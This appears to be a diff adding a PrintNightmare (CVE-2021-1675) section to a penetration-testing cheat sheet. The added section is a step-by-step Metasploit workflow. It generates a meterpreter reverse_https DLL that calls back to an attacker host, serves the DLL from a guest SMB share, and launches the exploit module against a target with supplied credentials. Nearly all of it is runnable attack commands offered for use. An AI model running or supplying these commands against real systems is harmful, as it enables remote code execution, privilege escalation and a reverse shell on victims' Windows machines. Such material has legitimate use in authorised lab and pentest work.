@@ -677,6 +677,37 @@ TODO
 
 POC is available [here](https://github.com/bb00/zer0dump).
 
+### PrintNightmare
+
+Example usage of PrintNightmare privilege escalation technique (using Metasploit):
+
+```sh
+# Inside msfconsole, generate a payload DLL (and corresponding handler) to be executed
+# in an elevated context.
+use payload/windows/x64/meterpreter/reverse_https
+set LHOST 10.10.14.105
+set LPORT 8888
+to_handler
+generate -f dll -o /home/user/payload-hosting/nightmare.dll
+
+# Outside of msfconsole, host the DLL on an SMB share so the victim can download it.
+cd ~/payload-hosting
+cat <<EOF >smb.conf
+[myshare]
+	comment = Public Directories
+	path = /home/user/payload-hosting
+	guest ok = Yes
+EOF
+sudo smbd --interactive --configfile=./smb.conf
+
+# Back in msfconsole, configure the PrintNightmare module and kick off exploitation.
+use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
+set DLL_PATH \\\\10.10.14.105\\myshare\\nightmare.dll
+set RHOSTS 10.10.11.106
+set SMBUser KNOWN_USER
+set SMBPass KNOWN_PASS
+```
+
 ## Linux Local Enumeration and Pivoting
 
 ### File System Enumeration
